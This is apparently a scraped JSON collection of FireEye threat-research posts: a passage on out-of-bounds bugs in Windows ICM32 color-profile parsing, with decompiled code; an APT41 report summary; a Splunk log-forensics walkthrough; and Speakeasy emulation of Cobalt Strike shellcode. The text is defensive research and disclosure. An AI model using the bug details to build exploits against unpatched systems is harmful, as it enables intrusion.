ntdll!RtlpAllocateHeap+0x0000000000077ae6 00007ffa5157babb ntdll!RtlpAllocateHeapInternal+0x00000000000001cb 00007ffa51479da0 msvcrt!malloc+0x0000000000000070 00007ffa46bf3805 icm32!SmartNewPtr+0x0000000000000011 00007ffa46bf37c8 icm32!SmartNewPtrClear+0x0000000000000014 00007ffa46c02d05 icm32!InitNamedColorProfileData+0x0000000000000085 00007ffa46bf6e39 icm32!Create_LH_ProfileSet+0x0000000000004e15 00007ffa46bf1973 icm32!PrepareCombiLUTs+0x0000000000000117 00007ffa46bf1814 icm32!CMMConcatInitPrivate+0x00000000000001f4 00007ffa46bf12a1 icm32!CWConcatColorWorld4MS+0x0000000000000075 00007ffa46bf11f4 icm32!CMCreateMultiProfileTransformInternal+0x00000000000000e8 00007ffa46bf1039 icm32!CMCreateMultiProfileTransform+0x0000000000000029 00007ffa48f16e6c mscms!CreateMultiProfileTransform+0x000000000000024c 00007ff774651191 ldr+0x0000000000001191 00007ff7746514b4 ldr+0x00000000000014b4 00007ffa505a7bd4 KERNEL32!BaseThreadInitThunk+0x0000000000000014 00007ffa515aced1 ntdll!RtlUserThreadStart+0x0000000000000021 Listing 2: Crash info icm32!SwapShortOffset reads unsigned short values, bswaps them and stores at the same location, giving this crash both read and write primitives. unsigned __int16 *__fastcall SwapShortOffset(void *sourceBuff, unsigned int offset, unsigned int len) { unsigned __int16 *endBuff; // r9 unsigned __int16 *result; // rax endBuff = (sourceBuff + len); for ( result = (sourceBuff + offset); result < endBuff; ++result ) *result = _byteswap_ushort(*result);        // read, bswap and write return result; } Listing 3: SwapShortOffset decompiled The crashing function icm32!SwapShortOffset doesn’t immediately point to the root cause of the bug. For that, we need to go one call up to icm32!InitNamedColorProfileData . __int64 __fastcall InitNamedColorProfileData(__int64 a1, void *hProfile, int a3, _DWORD *a4) { ... ... errCode = CMGetPartialProfileElement(hProfile, 'ncl2', 0, pBuffSize, 0i64);      // getting size of ncl2 element if ( errCode ) return errCode; minSize = pBuffSize[0]; if ( pBuffSize[0] < 0x55 ) minSize = 0x55; pBuffSize[0] = minSize; outBuff = SmartNewPtrClear(minSize, &errCode);                                    // allocating the buffer for ncl2 ... ... errCode = CMGetPartialProfileElement(hProfile, 'ncl2', 0, pBuffSize, outBuff);    // reading ncl2 elements to buffer if ( !errCode ) { ... ... totalSizeToRead = count * totalDeviceCoord; if ( totalSizeToRead < 0xFFFFFFFFFFFFFFAEui64 && totalSizeToRead + 0x51 <= pBuffSize[0] )  // totalSizeToRead + 0x51 <= element size? { currPtr = outBuff + 0x54;            // wrong offset of 0x54 is used ... ... do { SwapShortOffset((currPtr + 0x20), 0, 6u); ... --count; }while(count) Listing 4: InitNamedColorProfileData decompiled Here the code tries to read the ‘ncl2’ tag/element and get the size of the stream from file. A buffer is allocated and the same call is made once again to read the complete content of the element ‘ncl2’. This buffer is parsed to find the count and number of device coordinates, and the values are verified by making sure read/write ends up with in the buffer size. The vulnerability here is that the offset (0x51) used for verification is smaller than the offset (0x54) used to advance the buffer pointer. This error provides a 3 byte out of bound read and write. The fix for this was pretty straight forward—change the verification offset to 0x54, which is how Microsoft fixed this bug. Additional Vulnerabilities While looking at the previous vulnerability, one can see a pattern of using the CMGetPartialProfileElement function for reading the size, allocation, and reading content. This sort of pattern can introduce bugs such as unconstrained size or integer overflow while adding an offset to the size, etc. I decided to pursue this function and see if such instances are present within ICM32.dll. I found three instances which had an unchecked offset access: CMConvIndexToNameProfile , CMConvNameToIndexProfile and CMGetNamedProfileInfoProfile . All of these functions are accessible through exported and documented MSCMS functions: ConvertIndexToColorName , CMConvertColorNameToIndex , and GetNamedProfileInfo respectively. __int64 __fastcall CMConvIndexToNameProfile(HPROFILE hProfile, __int64 a2, __int64 a3, unsigned int a4) { ... ... errCode = CMGetPartialProfileElement(hProfile, 'ncl2', 0, pBuffSize, 0i64);    // read size if ( !errCode ) { allocBuff = SmartNewPtr(pBuffSize[0], &errCode); if ( !errCode ) { errCode = CMGetPartialProfileElement(hProfile, 'ncl2', 0, pBuffSize, allocBuff);    // read to buffer if ( !errCode ) { SwapLongOffset((allocBuff + 12), 0, 4u);         // 12 > *pBuffSize ? SwapLongOffset((allocBuff + 16), v12, v13); Listing 5: CMConvIndexToNameProfile decompiled The bug discovered in CMConvIndexToNameProfile and the other two functions is that there is no minimum length check for ‘ncl2’ elements and offsets 12 and 16 are directly accessed for both read and write—providing out of bound read/write to allocBuffer , if the size of allocBuffer is smaller than 12. Microsoft decided not to immediately fix these three vulnerabilities due to the fact that none of the Windows binaries use these functions. Independently, we did not find any Windows or third-party software using these APIs. Conclusion In part one of this blog series, we looked into color profiles, wrote a harness, hunted for corpus and successfully found multiple vulnerabilities. Stay tuned for part two, where we will be looking at a relatively less talked about vulnerability class: uninitialized memory. Subscribe to Blogs Get email updates as new blog posts are added."
            }
        },
        {
            "http://www.fireeye.com/blog/threat-research/2019/08/apt41-dual-espionage-and-cyber-crime-operation.html": {
                "metadata": {
                    "dateAccessed": "2021-07-27",
                    "dateCreated": "2019-08-07",
                    "source": "www.fireeye.com"
                },
                "text": "Today, FireEye Intelligence is releasing a comprehensive report detailing APT41, a prolific Chinese cyber threat group that carries out state-sponsored espionage activity in parallel with financially motivated operations. APT41 is unique among tracked China-based actors in that it leverages non-public malware typically reserved for espionage campaigns in what appears to be activity for personal gain. Explicit financially-motivated targeting is unusual among Chinese state-sponsored threat groups, and evidence suggests APT41 has conducted simultaneous cyber crime and cyber espionage operations from 2014 onward. The full published report covers historical and ongoing activity attributed to APT41, the evolution of the group’s tactics, techniques, and procedures (TTPs), information on the individual actors, an overview of their malware toolset, and how these identifiers overlap with other known Chinese espionage operators. APT41 partially coincides with public reporting on groups including BARIUM ( Microsoft ) and Winnti ( Kaspersky , ESET , Clearsky ). Who Does APT41 Target? Like other Chinese espionage operators, APT41 espionage targeting has generally aligned with China's Five-Year economic development plans . The group has established and maintained strategic access to organizations in the healthcare, high-tech, and telecommunications sectors. APT41 operations against higher education, travel services, and news/media firms provide some indication that the group also tracks individuals and conducts surveillance. For example, the group has repeatedly targeted call record information at telecom companies. In another instance, APT41 targeted a hotel’s reservation systems ahead of Chinese officials staying there, suggesting the group was tasked to reconnoiter the facility for security reasons. The group’s financially motivated activity has primarily focused on the video game industry, where APT41 has manipulated virtual currencies and even attempted to deploy ransomware. The group is adept at moving laterally within targeted networks, including pivoting between Windows and Linux systems, until it can access game production environments. From there, the group steals source code as well as digital certificates which are then used to sign malware. More importantly, APT41 is known to use its access to production environments to inject malicious code into legitimate files which are later distributed to victim organizations. These supply chain compromise tactics have also been characteristic of APT41’s best known and most recent espionage campaigns. Interestingly, despite the significant effort required to execute supply chain compromises and the large number of affected organizations, APT41 limits the deployment of follow-on malware to specific victim systems by matching against individual system identifiers. These multi-stage operations restrict malware delivery only to intended victims and significantly obfuscate the intended targets. In contrast, a typical spear-phishing campaign’s desired targeting can be discerned based on recipients' email addresses. A breakdown of industries directly targeted by APT41 over time can be found in Figure 1. Figure 1: Timeline of industries directly targeted by APT41 Probable Chinese Espionage Contractors Two identified personas using the monikers “Zhang Xuguang” and “Wolfzhi” linked to APT41 operations have also been identified in Chinese-language forums. These individuals advertised their skills and services and indicated that they could be hired. Zhang listed his online hours as 4:00pm to 6:00am, similar to APT41 operational times against online gaming targets and suggesting that he is moonlighting. Mapping the group’s activities since 2012 (Figure 2) also provides some indication that APT41 primarily conducts financially motivated operations outside of their normal day jobs. Attribution to these individuals is backed by identified persona information, their previous work and apparent expertise in programming skills, and their targeting of Chinese market-specific online games. The latter is especially notable because APT41 has repeatedly returned to targeting the video game industry and we believe these activities were formative in the group’s later espionage operations. Figure 2: Operational activity for gaming versus non-gaming-related targeting based on observed operations since 2012 The Right Tool for the Job APT41 leverages an arsenal of over 46 different malware families and tools to accomplish their missions, including publicly available utilities, malware shared with other Chinese espionage operations, and tools unique to the group. The group often relies on spear-phishing emails with attachments such as compiled HTML (.chm) files to initially compromise their victims. Once in a victim organization, APT41 can leverage more sophisticated TTPs and deploy additional malware. For example, in a campaign running almost a year, APT41 compromised hundreds of systems and used close to 150 unique pieces of malware including backdoors, credential stealers, keyloggers, and rootkits. APT41 has also deployed rootkits and Master Boot Record (MBR) bootkits on a limited basis to hide their malware and maintain persistence on select victim systems. The use of bootkits in particular adds an extra layer of stealth because the code is executed prior to the operating system initializing. The limited use of these tools by APT41 suggests the group reserves more advanced TTPs and malware only for high-value targets. Fast and Relentless APT41 quickly identifies and compromises intermediary systems that provide access to otherwise segmented parts of an organization’s network. In one case, the group compromised hundreds of systems across multiple network segments and several geographic regions in as little as two weeks. The group is also highly agile and persistent, responding quickly to changes in victim environments and incident responder activity. Hours after a victimized organization made changes to thwart APT41, for example, the group compiled a new version of a backdoor using a freshly registered command-and-control domain and compromised several systems across multiple geographic regions. In a different instance, APT41 sent spear-phishing emails to multiple HR employees three days after an intrusion had been remediated and systems were brought back online. Within hours of a user opening a malicious attachment sent by APT41, the group had regained a foothold within the organization's servers across multiple geographic regions. Looking Ahead APT41 is a creative, skilled, and well-resourced adversary, as highlighted by the operation’s distinct use of supply chain compromises to target select individuals, consistent signing of malware using compromised digital certificates, and deployment of bootkits (which is rare among Chinese APT groups). Like other Chinese espionage operators, APT41 appears to have moved toward strategic intelligence collection and establishing access and away from direct intellectual property theft since 2015. This shift, however, has not affected the group's consistent interest in targeting the video game industry for financially motivated reasons. The group's capabilities and targeting have both broadened over time, signaling the potential for additional supply chain compromises affecting a variety of victims in additional verticals. APT41's links to both underground marketplaces and state-sponsored activity may indicate the group enjoys protections that enables it to conduct its own for-profit activities, or authorities are willing to overlook them. It is also possible that APT41 has simply evaded scrutiny from Chinese authorities. Regardless, these operations underscore a blurred line between state power and crime that lies at the heart of threat ecosystems and is exemplified by APT41. Read the report today to learn more . Subscribe to Blogs Get email updates as new blog posts are added."
            }
        },
        {
            "http://www.fireeye.com/blog/threat-research/2020/09/dfur-ent-perspective-on-threat-modeling-and-application-log-forensic-analysis.html": {
                "metadata": {
                    "dateAccessed": "2021-07-27",
                    "dateCreated": "2020-09-14",
                    "source": "www.fireeye.com"
                },
                "text": "Many organizations operating in e-commerce, hospitality, healthcare, managed services, and other service industries rely on web applications. And buried within the application logs may be the potential discovery of fraudulent use and/or compromise! But, let's face it, finding evil in application logs can be difficult and overwhelming for a few reasons, including: The wide variety of web applications with unique functionality The lack of a standard logging format Logging formats that were designed for troubleshooting application issues and not security investigations The need for a centralized log analysis solution or SIEM to process and investigate a large amount of application log data So, in this blog post, we discuss threat modeling concepts that can help prioritize logging decisions and unleash the ability to identify and investigate attacks against an application. To help us demonstrate, we'll describe situations for a fictitious organization called Dog and Feline Urgent Response, or DFUR, that we presented at the 2020 SANS Digital Forensics & Incident Response (DFIR) Summit . We selected Splunk Enterprise Security (ES) as DFUR’s SIEM and logging analysis platform, but this is just one option and there are multiple technologies that can facilitate application log analysis. We created a Splunk application called “ Dog and Feline Urgent Response (DFUR) ” available on the FireEye GitHub that contains pre-indexed data and dashboards that you can use to follow along with the following attack scenarios. But, enough kitten around. Let’s introduce you to DFUR! DFUR: Dog and Feline Urgent Response DFUR is a long-standing organization in the pet wellness industry that provides care providers, pet owners, and insurance providers with application services. Care providers, such as veterinarians, use DFUR to process patient records, submit prescriptions, and order additional care services Pet owners use DFUR to make appointments, pay bills, and see diagnostic test results Insurance providers use DFUR to receive and pay claims to pet care providers Application users log into a web portal that forwards logon and user transaction logs to DFUR’s Splunk ES instance. Backend databases store metadata for users, such as street addresses and contact information. DFUR Security Team Threat Modeling After stumbling through several incidents, the DFUR security team realized that their application did not log the information needed to answer investigative question clearly and quickly. The team held workshops with technical stakeholders to develop a threat model and improve their application security strategy. They addressed questions, such as: What types of threats does DFUR face based on industry trends? What impact could those threats have? How could the DFUR application be attacked or abused? What log data would DFUR need to prove an attack or fraud happened? The DFUR team compiled the stakeholder feedback and developed a threat profile to identify and prioritize high-risk threats facing the DFUR application platform, including: Account takeover and abuse Password attacks (e.g., credential stuffing) Bank account modifications PHI/PII access Health service modifications or interruptions Fraudulent reimbursement claim submission Veterinarians over-prescribing catnip The DFUR security team discussed how they could identify threats using their currently available logs, and, well, the findings were not purr-ty. Logging Problems Identified The DFUR team used their threat model to determine what log sources were relevant to their security mission, and then they dug into each one to confirm the log events were valid, normalized, and accessible. This effort produced a list of high-priority logging issues that needed to be addressed before the security team could move forward with developing methods for detection and analysis: Local logs were not forwarded to their Splunk ES instance . Only a limited subset of logging was forwarded to their Splunk ES instance, so DFUR analysts couldn't search for the actions performed by users who were authenticated to the application portal. Inaccurate field mapping . DFUR analysts identified extracted field values that were mapped to incorrect field names. One example was the user-agent in authentication log events had been extracted as the username field. Application updates sometimes affected Splunk ingestion and parsing. DFUR analysts identified servers that didn't have a startup script to ensure log forwarding was enabled upon system reboot. Application updates changed the logging output format which broke field extractions. DFUR analysts didn't have a way to determine when log sources weren't operating as expected. Time zone misconfigurations . DFUR analysts determined their log sources had multiple time zone configurations which made correlation difficult. The log archival settings needed to be modified . DFUR analysts needed to configure their Splunk ES instance data retirement policy to maintain indexed data for a longer time period and archive historical data for quick restoration. Source IP addresses of users logging into the portal were masked by a load balancer. The DFUR analysts realized that the source IP address for every user logon was a load balancer, which made attribution even more difficult. The X-Forwarded-For (XFF) field in their appliances needed to be enabled. Analysis Problems Identified The DFUR infosec team reviewed how previous incidents involving the DFUR application were handled. They quickly learned that they needed to solve the following operational issues before they could effectively investigate application attacks: Inconsistency during manual analysis . DFUR analysts took different approaches to searching their Splunk ES instance, and they would reach different conclusions. Playbooks were needed to define a standard investigative methodology for common incident scenarios. No documentation of log fields or sources . Some DFUR analysts were not aware of all relevant data sources that were available when investigating security incidents. This led to findings that were based on a small part of the picture. A data dictionary was needed that defines the log sources and fields in the DFUR Splunk ES instance and the retention time for each log source. Application logs were designed for troubleshooting, not investigating . The DFUR application was configured to log diagnostic information, application errors, and limited subsets of successful user activity. The DFUR team needed to reconfigure and develop the application to record more security related events. DFUR: New and Improved Monitoring and Detection The DFUR team addressed their application log and analysis problems and started building a detection and investigative capability in their Splunk ES instance. Using the analysis workflows developed during the threat modeling process, the DFUR team designed Splunk dashboards (Figure 1) to provide detection analytics and context around three primary datapoints: usernames, IP addresses, and care providers (“organizations”). Figure 1: DFUR monitoring and detection dashboard The DFUR team created the Splunk dashboards using Simple XML to quickly identify alerts and pivot among the primary datapoints, as seen in Figure 2. The DFUR team knew that their improved and streamlined methodology would save time compared to exporting, analyzing, and correlating raw logs manually. Figure 2: Pivoting concepts used to develop DFUR dashboards Newly armed (legged?) with a monitoring and detection capability, the DFUR team was ready to find evil! Attack Scenario #1: Account Takeover The next morning, the DFUR security team was notified by their customer service team of a veterinarian provider with the username ‘labradorable’ who hadn’t received their daily claims payment and noticed their banking information in the DFUR portal was changed overnight. A DFUR analyst opened the User Activity Enrichment dashboard (Figure 3) and searched for the username to see recent actions performed by the account. Figure 3: User Activity Enrichment dashboard The analyst reviewed the Remote Access Analytics in the dashboard and identified the following anomalies (Figure 4): The username reminder and password reset action was performed the day before from an Indonesia-based IP address The user account was logged in from the same suspicious IP address shortly after The legitimate user always logs in from California, so the Indonesia source IP login activity was highly suspicious Figure 4: Remote access analytics based on user activity The DFUR analyst clicked on the Application Activity tab in the User Activity Enrichment dashboard to see what actions were performed by the user while they were logged in from the suspicious IP address. The analyst identified the user account logged in from the suspicious IP address and performed an email address change and added two (2) new bank accounts, as seen in Figure 5. Figure 5: Application activity timeline filtered based on IP address The DFUR analyst confirmed that the two (2) bank accounts were added by the user to the care provider with organization ID 754354, as seen in Figure 6. Figure 6: Bank accounts added and assigned to a provider By clicking on the organization ID in the Splunk results table, the DFUR analyst triggered a drill-down action to automatically open the Organization Enrichment Dashboard and populate the organization ID value with the results from the previous panel (Figure 7). The DFUR analyst determined that the bank routing information for the new bank accounts was inconsistent with the organization’s mailing address. Figure 7: Organization Enrichment Dashboard The activity indicated that the attacker had access to the user’s primary email and successfully reset the DFUR account password. The DFUR analyst confirmed that no other accounts were targeted by the suspicious IP address (Figure 8). Figure 8: IP Address Enrichment dashboard Attack Scenario #2: Credential Stuffing Later that afternoon, the DFUR team began receiving reports of account lockouts in the patient and provider portals when users tried to login. The security team was asked to investigate potential password attack activity on their DFUR platform. The DFUR analyst pulled up the main monitoring and detection dashboard and scrolled down to the panel focused on identifying potential password attack activity (Figure 9). They identified five (5) IP addresses associated with an elevated number of failed login attempts, suggesting a password spray or credential stuffing attack with varying success. Figure 9: Dashboard panel showing potential password attack events The DFUR analyst clicked on one of the IP addresses which triggered a drill-down action to open the IP Address Enrichment dashboard and prepopulate the IP address token value (Figure 10). Figure 10: IP Address Enrichment dashboard The DFUR analyst identified more than 3,000 failed login attempts associated with the IP address with three (3) successful logins that morning. The Remote Access Analytics panels for the IP address further showed successful logins for accounts that may have been successfully compromised and need to be reset (Figure 11). Figure 11: Remote access analytics for IP address Conclusion After implementing the newly developed logs and analysis capabilities and by leveraging Splunk’s security solutions, the DFUR security team drastically improved key metrics aligned with their application security missions: Identify compromise and fraud before customers report it Analyze 90% of application security events within 30 minutes Answer all investigation questions from users, compliance, and legal teams Mandiant and the whole DFUR security team hope you can use the scenarios and references in this post to improve your log analysis and how you leverage a SIEM solution in the following ways: Reflect on your current logging gaps and capabilities to improve Enhance logs from “whatever the developers implemented” to “designed to be investigated” Develop investigative workflows that are reliable and repeatable Correlate pivot points between your data sources and streamline correlation capabilities Create monitoring and alerting capabilities based on threat modeling Lower the technical barrier for comprehensive analysis Implement similar analysis capabilities to those in the “DFUR” Splunk application, linked in the References section Understand that logs can lead into better security analytics and strengthening of your security operations References For organizations that utilize Splunk security solutions as their SIEM solution, for automation, analytics or log aggregation, or want to try out for free with Splunk’s free trial download, we developed an application called “Dog and Feline Urgent Response (DFUR)” to demonstrate application log forensic analysis and dashboard pivoting concepts. The code contains pre-indexed data and CSV files referenced by searches contained in four Splunk XML dashboards. All data, such as IP addresses and usernames, was fabricated for the purposes of the demo and any association with organizations, users, or pets is coincidental. Watch the recording of our SANS DFIR Summit presentation . Download the \"DFUR\" Splunk application in FireEye GitHub . If you need assistance investigating application attacks or developing log analysis capabilities, contact us at investigations@mandiant.com. Subscribe to Blogs Get email updates as new blog posts are added."
            }
        },
        {
            "http://www.fireeye.com/blog/threat-research/2020/08/emulation-of-malicious-shellcode-with-speakeasy.html": {
                "metadata": {
                    "dateAccessed": "2021-07-27",
                    "dateCreated": "2020-08-26",
                    "source": "www.fireeye.com"
                },
                "text": "In order to enable emulation of malware samples at scale, we have developed the Speakeasy emulation framework . Speakeasy aims to make it as easy as possible for users who are not malware analysts to acquire triage reports in an automated way, as well as enabling reverse engineers to write custom plugins to triage difficult malware families. Originally created to emulate Windows kernel mode malware, Speakeasy now also supports user mode samples. The project’s main goal is high resolution emulation of the Windows operating system for dynamic malware analysis for the x86 and amd64 platforms. Similar emulation frameworks exist to emulate user mode binaries. Speakeasy attempts to differentiate from other emulation frameworks the following ways: Architected specifically around emulation of Windows malware Supports emulation of kernel mode binaries to analyze difficult to triage rootkits Emulation and API support driven by current malware trends to provide the community with a means to extract indicators of compromise with no extra tooling Completely configurable emulation environment requiring no additional code The project currently supports kernel mode drivers, user mode Windows DLLs and executables, as well as shellcode. Malware samples can be automatically emulated, with reports generated for later post processing. The ongoing project goal will be continuing to add support for new or popular malware families. In this blog post, we will show an example of Speakeasy’s effectiveness at automatically extracting network indicators from a Cobalt Strike Beacon sample acquired from an online malware aggregate. Background Dynamic analysis of Windows malware has always been a crucial step during the malware analysis process. Understanding how malware interacts with the Windows API and extracting valuable host-based and network-based indicators of compromise (IOCs) are critical to assessing the impact malware has on an affected network. Typically, dynamic analysis is performed in an automated or targeted fashion. Malware can be queued to execute within a sandbox to monitor its functionality, or manually debugged to reveal code paths not executed during sandbox runs. Code emulation has been used historically for testing, validation and even malware analysis. Being able to emulate malicious code lends many benefits from both manual and automated analysis. Emulation of CPU instructions allows for total instrumentation of binary code where control flow can be influenced for maximum code coverage. While emulating, all functionality can be monitored and logged in order to quickly extract indicators of compromise or other useful intelligence. Emulation provides several advantages over execution within a hypervisor sandbox. A key advantage is noise reduction. While emulating, the only activity that can be recorded is either written by the malware author, or statically compiled within the binary. API hooking within a hypervisor (especially from a kernel mode perspective) can be difficult to attribute to the malware itself. For example, sandbox solutions will often hook heap allocator API calls without knowing if the malware author intended to allocate memory, or if a lower-level API was responsible for the memory allocation. However, emulation has disadvantages as well. Since we are removing the operating system from the analysis phase, we, as the emulator, are now responsible for providing the expected inputs and outputs from API calls and memory access that occur during emulation. This requires substantial effort in order to successfully emulate malware samples that are expected to the run on a legitimate Windows system. Shellcode as an Attack Platform In general, shellcode is an excellent choice for attackers to remain stealthy on an infected system. Shellcode runs within executable memory and does not need to be backed by any file on disk. This allows attacker code to hide easily within memory where most forms of traditional forensic analysis will fail to identify it. Either the original binary file that loads the shellcode must first be identified, or the shellcode itself must be dumped from memory. To avoid detection, shellcode can be hidden within a benign appearing loader, and then be injected into another user mode process. In the first part of this blog series, we will show the effectiveness of emulation with one of the more common samples of shellcode malware encountered during incident response investigations. Cobalt Strike is a commercial penetration testing framework that typically utilizes stagers to execute additional code. An example of a stager is one that downloads additional code via a HTTP request and executes the HTTP response data. The data in this case is shellcode that commonly begins with a decode loop, followed by a valid PE that contains code to reflectively load itself. In the case of Cobalt Strike, this means it can be executed from the start of the executable headers and will load itself into memory. Within the Cobalt Strike framework, the payload in this case is typically an implant known as Beacon. Beacon is designed to be a memory resident backdoor used to maintain command and control (C2) over an infected Windows system. It is built using the Cobalt Strike framework without any code modifications and can be easily built to have its core functionality and its command and control information modified. All of this allows attackers to rapidly build and deploy new variants of Beacon implants on compromised networks. Therefore, a tool to rapidly extract the variable components of Beacon are necessary and, ideally, will not require the valuable time of malware analysts. Speakeasy Design Speakeasy currently employs the QEMU-based emulator engine Unicorn to emulate CPU instructions for the x86 and amd64 architectures. Speakeasy is designed to support arbitrary emulation engines in the future via an abstraction layer, but it currently relies on Unicorn. Full OS sandboxing will likely always be required to analyze all samples as generically emulating all of Windows is somewhat unfeasible. Sandboxing can be difficult to scale on demand and can be time consuming to run samples. However, by making sure we emulate specific malware families, such as Beacon in this example, we can quickly reduce the need to reverse engineer variants. Being able to generate high level triage reports in an automated fashion is often all the analysis that is needed on a malware variant. This allows malware analysts more time to focus on samples that may require deeper analysis. Shellcode or Windows PEs are loaded into the emulated address space. Windows data structures required to facilitate basic emulation of Windows kernel mode and user mode are created before attempting to emulate the malware. Processes, drivers, devices and user mode libraries are “faked” in order to present the malware with a realistic looking execution environment. Malware will be able to interact with an emulated file system, network and registry. All these emulated subsystems can be configured with a configuration file supplied to each emulation run. Windows APIs are handled by Python API handlers. These handlers will try to emulate expected outputs from these APIs so that malware samples will continue their expected execution path. When defining an API handler, all that is needed is the name of the API, the number of arguments the API expects, and an optional calling convention specification. If no calling convention is supplied, stdcall is assumed. Currently, if an API call is attempted that is not supported, Speakeasy will log the unsupported API and move on to the next entry point. An example handler for the Windows HeapAlloc function exported by kernel32.dll is shown in Figure 1. Figure 1: Example handler for Windows HeapAlloc function All entry points are emulated by default. For example, for DLLs, all exports are emulated, and for drivers, the IRP major functions are each emulated. In addition, dynamic entry points that are discovered during runtime are followed. Some examples of dynamic entry points include threads that are created or callbacks that are registered. Attributing activity to specific entry points can be crucial to seeing the whole picture when trying to identify the impact of a malware infection. Reporting Currently, all events captured by the emulator are logged and represented by a JSON report for easy post processing. This report contains events of interest that are logged during emulation. Like most emulators, all Windows API calls are logged along with arguments. All entry points are emulated and tagged with their corresponding API listings. In addition to API tracing, other specific events are called out including file, registry and network access. All decoded or “memory resident” strings are dumped and displayed in the report to revealed useful information not found within static string analysis. Figure 2 shows an example of a file read event logged in a Speakeasy JSON report. Figure 2: File read event in a Speakeasy report Speed Because the framework is written in Python, speed is an obvious concern. Unicorn and QEMU are written in C, which provides very fast emulation speeds; however, the API and event handlers we write are in Python. Transitioning between native code and Python is extremely expensive and should be done as little as possible. Therefore, the goal is to only execute Python code when it is absolutely necessary. By default, the only events we handle in Python are memory access exceptions or Windows API calls. In order to catch Windows API calls and emulate them in Python, import tables are doped with invalid memory addresses so that we only switch into Python when import tables are accessed. Similar techniques are used for when shellcode accesses the export tables of DLLs loaded within the emulated address space of the malware. By executing as little Python code as possible, we can maintain reasonable speeds while still allowing users to rapidly develop capabilities for the framework. Memory Management Speakeasy implements a lightweight memory manager on top of the emulator engine’s memory management. Each chunk of memory allocated by malware is tracked and tagged so that meaningful memory dumps can be acquired. Being able to attribute activity to specific chunks of memory can prove to be extremely useful for analysts. Logging memory reads and writes to sensitive data structures can reveal the true intent of malware not revealed by API call logging, which is particularly useful for samples such as rootkits. Speakeasy offers an optional “memory tracing” feature that will log all memory accesses that samples exhibit. This will log all reads, writes and executes to memory. Since the emulator tags all allocated memory chunks, it is possible to glean much more context from this data. If malware hooks a critical data structure or pivots execution to dynamically mapped memory this will be revealed and can be useful for debugging or attribution. This feature comes at a great speed cost, however, and is not enabled by default. The emulated environment presented to malware includes common data structures that shellcode uses to locate and execute exported Windows system functions. It is necessary to resolve exported functions in order to invoke the Win32 API and therefore have meaningful impact on a targeted system. In most cases, Beacon included, these functions are located by walking the process environment block (commonly called the PEB). From the PEB, shellcode can access a list of all loaded modules within a process’s virtual address space. Figure 3 shows a memory report generated from emulating a Beacon shellcode sample. Here we can trace the malware walking the PEB in order to find the address of kernel32.dll. The malware then manually resolves and calls the function pointer for the “VirtualAlloc” API, and proceeds to decode and copy itself into the new buffer to pivot execution. Figure 3: Memory trace report Configuration Speakeasy is highly configurable and allows users to create their own “execution profiles”. Different levels of analysis can be specified in order to optimize individual use cases. The end goal is allowing users easy switching of configuration options with no code changes. Configuration profiles are currently structured as JSON files. If no profile is provided by the user, a default configuration is provided by the framework. The individual fields are documented within the Speakeasy project. Figure 4 shows a snippet of the network emulator configuration subsection. Here, users can specify what IP addresses get returned when a DNS lookup occurs, or in the case of some Beacon samples, what binary data gets returned during a TXT record query. HTTP responses have custom responses configured as well. Figure 4: Network configuration Many HTTP stagers will retrieve a web resource using a HTTP GET request. Often, such as with Cobalt Strike or Metasploit stagers, this buffer is then immediately executed so the next stage of execution can begin. This response can be easily configured with Speakeasy configurations. In the configuration in Figure 4, unless overridden, the framework will supply the data contained in the referenced default.bin file. This file currently contains debug interrupt instructions (int3), so if the malware attempts to execute the data it exits and will be logged in the report. Using this, we can easily label the malware as a downloader that downloads additional code. Configuration fields also exist for file system and registry emulation. Files and registry paths can similarly be configured to return data to samples that expect to be running on a live Windows system. Limitations As said, emulation comes with some challenges. Maintaining feature parity with the system being emulated is an ongoing battle; however, it provides unique opportunities for controlling the malware and greater introspection options. In cases where emulation does not complete fully, emulation reports and memory dumps can still be generated in order to gather as much data as possible. For example, a backdoor may successfully install its persistence mechanism, but fail to connect to its C2 server. In this situation, the valuable host-based indicators are still logged and can provide value to an analyst. Missing API handlers can quickly and easily be added to the emulator in order to handle these situations. For many API handlers, simply returning a success code will be sufficient to make the malware to continue execution. While full emulation of every piece of malware may not be feasible, targeting functionality of specific malware families can greatly reduce the need to reverse engineer variants of the same families. Usage Speakeasy is available right now on our GitHub . It can be installed with the included Python installer script or installed within a Docker container using the provided Dockerfile. It is platform agnostic and can be used to emulate Windows malware on Windows, Linux or MacOS. More information can be found on the project’s README . Once installed, Speakeasy can be used as a standalone library or invoked directly using the provided run_speakeasy.py script. In this blog post we will demonstrate how to emulate a malware sample directly from the command line. For information on how to use Speakeasy as a library, see the project’s README . The included script is meant to emulate a single sample and generate a JSON report with the logged events. The command line arguments for run_speakeasy.py are shown in Figure 5. Figure 5: Command line arguments for run_speakeasy.py Speakeasy also offers a rich development and hooking interface for writing custom plugins. This will be covered in more detail in a later blog post. Emulation of a Beacon Implant For this example, we will be emulating shellcode that decodes and executes a Beacon implant variant that has a SHA-256 hash of 7f6ce8a8c2093eaf6fea1b6f1ef68a957c1a06166d20023ee5b637b5f7838918. We begin by verifying the file format of the sample. This sample is expected to be launched either by a loader or used as part of an exploit payload. Figure 6: Hex dump of malware sample In Figure 6, we can clearly see that the file is not in the PE file format. An analyst who has seen many shellcode samples may notice the first two bytes: “0xfc 0xe8”. These bytes disassemble to the intel assembly instructions “cld” and “call”. The “cld” instruction is a common prelude to position independent shellcode as it will clear the direction flag allowing malware to easily parse string data from system DLL’s export tables. The following call instruction is often used by shellcode to get its current program counter by following it with a “pop” instruction. This allows the malware to discover where it is executing from in memory. Since we are reasonably certain this sample is shellcode, we will invoke Speakeasy with the command line shown in Figure 7. Figure 7: Command line used to emulate malware sample This will instruct Speakeasy to emulate the sample from offset zero as x86 shellcode. Note: even though we are emulating code and not actually executing it, these are still attacker generated binaries. It may still be wise to emulate malicious code within a virtual machine in the event a vulnerability is discovered in whatever native CPU emulation engine is used. After emulation, a report will be generated named “report.json”. In addition, a full memory dump of the emulation environment will be compressed and written to “memory_dump.zip”. The malware will get loaded into emulated memory inside of a fake container process to simulate a real execution environment that shellcode would expect to be running in. Once emulation begins, emulated API calls will be logged to the screen along with their arguments and return values. Figure 8 shows the Beacon sample allocating a new memory buffer where it will copy itself. The malware then begins to manually resolve exports it needs to execute. Figure 8: Network configuration After additional decoding and setup, the malware attempts to connect to its C2 server. In Figure 9, we can see the malware using the Wininet library to connect and read data from the C2 server using HTTP. Figure 9: Wininet API calls to connect to C2 The malware will loop endlessly until it receives the data it expects from its C2 server. Speakeasy will timeout after a predetermined amount of time and generate a JSON report. Figure 10: Network C2 events The network indicators are summarized in the “network_events” and “traffic” sections of the generated report. In Figure 10, we can see the IP address, port number and, in this case, HTTP headers associated with the connections made by the malware. In this example, when we emulated the sample, we instructed 